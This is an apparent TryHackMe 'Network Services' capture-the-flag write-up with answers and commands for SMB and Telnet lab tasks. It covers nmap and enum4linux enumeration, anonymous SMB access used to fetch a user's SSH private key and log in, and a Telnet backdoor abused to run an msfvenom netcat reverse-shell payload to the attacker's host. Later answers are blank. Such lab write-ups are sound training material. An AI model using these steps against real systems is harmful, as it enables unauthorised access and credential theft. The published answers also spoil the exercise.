# THM - Network Services

<br>

## Task 2

### Task 2.1

> Server Message Block

### Task 2.2

> response-request

### Task 2.3

> TCP/IP

### Task 2.4

> Unix

<br>

## Task 3

### Task 3.1

```shell
mkdir nmap
nmap -sC -sV -oN nmap/initial 10.10.52.200
```

> 3

### Task 3.2

> 139/445

### Task 3.3

```shell
mkdir enum4linux
enum4linux -a 10.10.52.200 | tee enum4linux/initial
```

> WORKGROUP

### Task 3.4

> polosmb

### Task 3.5

> 6.1

### Task 3.6

> profiles

<br>

## Task 4

https://www.cvedetails.com/cve/CVE-2017-7494/

🧰 https://www.samba.org/samba/docs/current/man-html/smbclient.1.html

### Task 4.1

> smbclient //10.10.10.2/secret -U suit

### Task 4.3

```shell
smbclient //10.10.52.200/profiles -U Anonymous
```

> Y

### Task 4.4

```shell
	ls
	more "Working From Home Information.txt"
		q
```

> John Cactus

### Task 4.5

> ssh

### Task 4.6

> .ssh

### Task 4.7

```shell
	cd .ssh
	ls
```

> id_rsa

### Task 4.8

```shell
	mget id_rsa
		yes
	more "id_rsa.pub"
		q
```

Username: cactus

```shell
mv id_rsa ~/.ssh/id_rsa
chmod 600 ~/.ssh/id_rsa

ssh cactus@10.10.52.200
	ls
	cat smb.txt
```

> THM{smb_is_fun_eh?}

<br>

## Task 5

### Task 5.1

> application protocol

### Task 5.2

> ssh

### Task 5.3

> telnet 10.10.10.3 23

### Task 5.4

> encryption

<br>

## Task 6

### Task 6.1

```shell
nmap -sC -sV -oN nmap/initial2 10.10.222.51

nmap -sC -sV -oN nmap/initial2_part2 -p- 10.10.222.51
```

> 1

### Task 6.2

> 8012

### Task 6.3

> tcp

### Task 6.4

> 0

### Task 6.6

> a backdoor

### Task 6.7

> SKIDY

<br>

## Task 7

```shell
telnet 10.10.222.51 8012
```

### Task 7.2

> SKIDY'S BACKDOOR.

### Task 7.3

```shell
	.HELP
	.RUN
```

> N

### Task 7.6

```shell
sudo tcpdump ip proto \\icmp -i tun0
```

```shell
	.RUN ping 10.10.107.46 -c 1
```

> Y

### Task 7.8

```shell
	.RUN msfvenom -p cmd/unix/reverse_netcat lhost=10.10.107.46 lport=9876 R
```

> mkfifo

### Task 7.9

> 

### Task 7.11

> 

<br>

## Task 8

### Task 8.1

> 

### Task 8.2

> 

### Task 8.3

> 

<br>

## Task 9

### Task 9.1

> 

### Task 9.2

> 

### Task 9.3

> 

### Task 9.4

> 

### Task 9.5

> 

<br>

## Task 10

### Task 10.1

> 

### Task 10.3

> 

<br>

https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef

https://attack.mitre.org/techniques/T1210/

https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/

